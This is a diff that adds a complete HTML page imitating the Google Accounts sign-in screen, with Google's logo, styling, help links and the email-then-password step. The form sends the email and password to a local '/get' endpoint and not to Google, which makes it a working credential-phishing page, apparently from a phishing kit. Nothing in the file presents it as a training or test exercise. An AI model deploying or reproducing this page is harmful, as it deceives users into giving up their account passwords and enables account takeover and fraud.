@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - Google Accounts</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Google Sans', Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f0f4f9;
+      color: #202124;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding-top: 5%;
+    }
+
+    .container {
+      width: 450px;
+      padding: 48px 40px 36px;
+      border-radius: 28px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      color: #1f1f1f;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      font-size: var(--wf-tfs-bp3, 2.25rem);
+      font-weight: 400;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 16px;
+      color: #444746;
+      margin-bottom: var(--wf-stfs, 1rem);
+    }
+
+    .input-container {
+      margin-bottom: 24px;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #444746;
+      border-radius: 4px;
+      margin-bottom: 8px;
+      height: 56px;
+      background-color: #ffffff;
+      color: #444746;
+    }
+
+    input[type="email"]:focus {
+      border: 2px solid #a8c7fa;
+      outline: none;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #444746;
+      border-radius: 4px;
+      margin-bottom: 8px;
+      height: 56px;
+      background-color: #ffffff;
+      color: #444746;
+      display: none;
+    }
+
+    input[type="password"]:focus {
+      border: 2px solid #0b57d0;
+      outline: none;
+    }
+
+    .forgot-email {
+      color: #0b57d0;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .forgot-email:hover {
+      text-decoration: underline;
+    }
+
+    .note {
+      font-size: 0.875rem;
+      color: #444746;
+      margin: 32px 0;
+      line-height: 1.4286;
+    }
+
+    .guest-mode {
+      color: #0b57d0;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .private-window:hover {
+      text-decoration: underline;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 26px;
+    }
+
+    .create-account {
+      color: #0b57d0;
+      font-weight: 500;
+      text-decoration: none;
+      padding: 8px 0;
+    }
+
+    .create-account:hover {
+      text-decoration: underline;
+    }
+
+    .next {
+      background-color: #0b57d0;
+      color: #ffffff;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 28px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      min-width: 80px;
+    }
+
+    .next:hover {
+      background-color: #437ac2;
+      box-shadow: 0 1px 3px 1px rgba(66, 64, 67, .15);
+    }
+
+    footer {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 50px;
+      font-size: 12px;
+      color: #1f1f1f;
+      width: 100%;
+      max-width: 450px;
+      padding: 0 40px;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 16px;
+      font-size: 0.75rem;
+    }
+
+    .footer-links a {
+      color: #1f1f1f;
+      text-decoration: none;
+      font-size: 0.75rem;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    select {
+      border: none;
+      color: #1f1f1f;
+      background: transparent;
+      font-size: 12px;
+      padding: 5px 0;
+      font-size: 0.75rem;
+    }
+
+    select:focus {
+      outline: none;
+      background-color: #ffffff;
+    }
+
+    @media (max-width: 600px) {
+      body {
+        background-color: #ffffff;
+        justify-content: flex-start;
+      }
+
+      .container {
+        width: 100%;
+        border: none;
+        padding: 24px;
+        background-color: transparent;
+        margin: 0;
+        margin-top: -5%;
+      }
+
+      .logo {
+        text-align: left;
+      }
+
+      h1 {
+        text-align: left;
+      }
+
+      .subtitle {
+        text-align: left;
+      }
+
+      footer {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        padding: 16px 24px;
+        background-color: #ffffff;
+        margin-top: 0;
+        max-width: 100%;
+      }
+
+      .footer-links {
+        order: 2;
+      }
+
+      select {
+        order: 1;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="main-content">
+    <div class="container">
+      <div class="logo">
+        <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true"
+          jsname="jjf7Ff">
+          <path fill="#4285F4"
+            d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z">
+          </path>
+          <path fill="#34A853"
+            d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z">
+          </path>
+          <path fill="#FABB05"
+            d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z">
+          </path>
+          <path fill="#E94235"
+            d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z">
+          </path>
+        </svg>
+      </div>
+      <h1>Sign in</h1>
+      <div class="subtitle">Use your Google Account</div>
+
+      <div class="input-container">
+        <form action="/get" id="login-form">
+          <input name="email" id="email" class="input-field" type="email" placeholder="Email or phone" required>
+          <input name="password" id="password" class="input-field" type="password" placeholder="Password" required>
+          <a href="https://accounts.google.com/signin/v2/usernamerecovery?" class="forgot-email">Forgot email?</a>
+      </div>
+
+
+      <div class="note">
+        Not your computer? Use a Private Window to sign in. <a class="guest-mode"
+          href="https://support.google.com/accounts/answer/2917834?visit_id=638805153557213862-2408410378&p=signin_privatebrowsing&hl=en&rd=1">Learn
+          more about using Guest mode</a>
+      </div>
+
+      <div class="buttons">
+        <a href="" class="create-account">Create account</a>
+        <button class="next" id="next-button" type="button">Next</button>
+      </div>
+
+      </form>
+    </div>
+
+    <footer>
+      <select>
+        <option>English (United States)</option>
+        <option>Nederlands</option>
+        <option>Français</option>
+        <option>Deutsch</option>
+      </select>
+      <div class="footer-links">
+        <a href="https://support.google.com/accounts">Help</a>
+        <a href="https://policies.google.com/privacy">Privacy</a>
+        <a href="https://policies.google.com/terms">Terms</a>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    document.getElementById('next-button').addEventListener('click', function () {
+      const emailField = document.getElementById('email');
+      const passwordField = document.getElementById('password');
+
+      if (passwordField.style.display === 'none' || passwordField.style.display === '') {
+
+        if (emailField.value.trim() === '') {
+          emailField.focus();
+          return;
+        }
+
+        passwordField.style.display = 'block';
+        passwordField.focus();
+
+      } else {
+        if (passwordField.value.trim() === '') {
+          passwordField.focus();
+          return;
+        }
+
+        document.getElementById('login-form').submit();
+      }
+    });
+  </script>
+</body>
+
+</html>
